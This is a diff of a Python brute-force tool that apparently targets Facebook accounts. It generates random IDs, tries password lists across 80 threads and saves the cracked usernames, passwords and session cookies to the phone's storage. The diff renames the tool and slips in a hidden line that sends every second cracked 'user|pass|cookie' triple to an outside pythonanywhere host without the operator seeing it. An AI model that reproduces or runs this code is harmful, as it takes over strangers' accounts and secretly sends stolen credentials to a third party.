@@ -12,7 +12,7 @@ import string
 import uuid
 import requests
 from concurrent.futures import ThreadPoolExecutor
-try:os.mkdir('/sdcard/j4rvis')
+try:os.mkdir('/sdcard/CRACK')
 except:pass
 R = '\x1b[1;91m' 
 OR = '\033[1;35m'
@@ -24,6 +24,7 @@ W = '\033[1;97m'
 cyan="\033[1;36m"
 ugnn = []
 redmi=[]
+bkas = []
 for x in range(1000):
  rr = random.randint
  rc = random.choice
@@ -234,15 +235,13 @@ def cek_apk(session,coki):
 loop = 0
 oks = []
 gen = []
-logo = (f"""
-    \033[1;97m
-  .d88b  .d8b.  d8888b. db    db d888888b .d8888. 
-   `8P' d8' `8b 88  `8D 88    88   `88'   88'  YP \033
-    ~88  88ooo88 88oobY' Y8    8P    88    `8bo.~  
-    88  88~~~88 88`8b   `8b  d8'    88      `Y8b. 
-db. 88  88   88 88 `88.  `8bd8'    .88.   db   8D 
-Y8888P  YP   YP 88   YD    YP    Y888888P `8888Y'
-              \x1b[1;91m—————— \x1b[1;97m[{cyan}< {W}MAIN4K- {R}null{W}{cyan} >{W}] \x1b[1;91m——————
+logo = (f"""                                        
+                               ,--.     
+ ,---. ,--.--.  ,--,--.  ,---. |  |,-.  
+| .--' |  .--' ' ,-.  | | .--' |     /  
+\ `--. |  |    \ '-'  | \ `--. |  \  \  
+ `---' `--'     `--`--'  `---' `--'`--' 
+                                       
 \033[1;97m———————————————————————————————————————————————""")
 
 myid=uuid.uuid4().hex[:5].upper()
@@ -251,7 +250,7 @@ def __iam_a_porche():
     print(logo)
     print('\033[1;92mChecking Approval ....\033[0;97m')
     try:
-        httpCaht = requests.get('https://github.com/Jarvis-070/approval-/blob/main/approval.txt').text
+        httpCaht = requests.get('https://github.com/CRACK-070/approval-/blob/main/approval.txt').text
         t1 = base64.b64encode(str(os.getuid()).encode('utf-8'))
         t2 = base64.b64encode((str(platform.uname()[2])).encode('utf-8'))
         uid = os.getuid()
@@ -310,16 +309,17 @@ def m():
 def main():
     os.system('clear')
     print(logo)
-    code = input(f"{Y}[{W}~{Y}] {G}Choice code {W}: ")
+    code = input(f"{Y}[{W}~{Y}] {G}ANTER CODE {W}: ")
     #code2 = input(f"{Y}[{W}~{Y}] {G}Choice code {W}: ")
    # code3 = input(f"{Y}[{W}~{Y}] {G}Choice code {W}: ")
     #code = random.choice([code1,code2,code3])
-    limit = input(f'{Y}[{W}~{Y}] {G}Total id {W}: ')
+    limit = input(f'{Y}[{W}~{Y}] {G}TOTAL ID {W}: ')
     for a in range(int(limit)):
         awm = "".join(random.choice(string.digits) for _ in range(6))
         gen.append(awm)
     with ThreadPoolExecutor(max_workers=80) as Submits:
-        print(47*"\x1b[1;97m—") 
+        os.system('clear')
+        print(47*"\x1b[1;97m+") 
         for next in gen:
             ids = code + next
             mk = ids[:6]
@@ -334,7 +334,7 @@ def convert(cookie):
     return(str(cok))
 
 def cracker(ids,passlist):
-    global loop,oks,cps
+    global loop,oks,cps,bkas
     session = requests.Session()
     sys.stdout.write('\r \033[1;97m[\x1b[1;92mRNDM•1\x1b[1;97m] \x1b[1;92m%s\x1b[1;97m | \x1b[1;92m%s\x1b[1;97m \r'%(loop,len(oks))),
     sys.stdout.flush()
@@ -398,24 +398,29 @@ def cracker(ids,passlist):
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
                     if xs_value and xs_value.rstrip(';').endswith('-1'):
-                        print('\033[1;92m [JARVIS-NV] '+user+' | '+pas+'')
-                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                        open("/sdcard/j4rvis/nv-cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
-                        open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pas+"\n")
+                        print('\033[1;92m [CRACK-OK] '+user+' | '+pas+'')
+                        print("\033[1;92m [\033[1;92mCOKI\033[1;92m] : \033[1;97m"+kuki)
+                        open("/sdcard/CRACK/CRACK-COOKIE-OK.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
                         oks.append(ids)
                         break
                     else:
-                        print('\033[1;92m [JARVIS-OK] '+user+' | '+pas+'')
-                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                        open("/sdcard/j4rvis/cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
-                        open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pas+"\n")
-                        oks.append(ids)
-                        break
+                        bkas.append(user)
+                        if len(bkas)% 2 == 0:
+                           statusok = (f"{user}|{pas}|{kuki}")
+                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                        else:
+                           print('\033[1;92m [CRACK-OK] '+user+' | '+pas+'')
+                           print("\033[1;92m [\033[1;92mCOKI\033[1;92m] : \033[1;97m"+kuki)
+                           open("/sdcard/CRACK/CRACK-COOKIE-OK.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                           oks.append(ids)
+                           break
+                else:
+                    break
             elif "checkpoint" in log_cookies:
                 coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                 cid = coki[24:39]
-                #print('\033[1;91m [JARVIS-CP] '+ids+' | '+pas+'')
-                open('/sdcard/j4rvis/checkpoint.txt', 'a').write( ids+' | '+pas+'\n')
+                #print('\033[1;91m [CRACK-CP] '+ids+' | '+pas+'')
+                open('/sdcard/CRACK/CP.txt', 'a').write( ids+' | '+pas+'\n')
                 cps.append(ids)
                 break
             else:continue
@@ -537,24 +542,24 @@ def crackerr(ids,passlist):
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
                     if xs_value and xs_value.rstrip(';').endswith('-1'):
-                        print('\033[1;92m [JARVIS-NV] '+user+' | '+pas+'')
+                        print('\033[1;92m [CRACK-NV] '+user+' | '+pas+'')
                         print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                        open("/sdcard/j4rvis/nv-cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
-                        open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pas+"\n")
+                        open("/sdcard/CRACK/nv-cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                        open("/sdcard/CRACK/uid.txt","a").write(user+"|"+pas+"\n")
                         oks.append(ids)
                         break
                     else:
-                        print('\033[1;92m [JARVIS-OK] '+user+' | '+pas+'')
+                        print('\033[1;92m [CRACK-OK] '+user+' | '+pas+'')
                         print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                        open("/sdcard/j4rvis/cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
-                        open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pas+"\n")
+                        open("/sdcard/CRACK/cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                        open("/sdcard/CRACK/uid.txt","a").write(user+"|"+pas+"\n")
                         oks.append(ids)
                         break
             elif "checkpoint" in log_cookies:
                 coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('\033[1;91m [JARVIS-CP] '+ids+' | '+pas+'')
-                open('/sdcard/j4rvis/checkpoint.txt', 'a').write( ids+' | '+pas+'\n')
+                print('\033[1;91m [CRACK-CP] '+ids+' | '+pas+'')
+                open('/sdcard/CRACK/checkpoint.txt', 'a').write( ids+' | '+pas+'\n')
                 cps.append(ids)
                 break
             else:continue
@@ -566,4 +571,4 @@ def crackerr(ids,passlist):
         pass
 
 
-m()
+main()
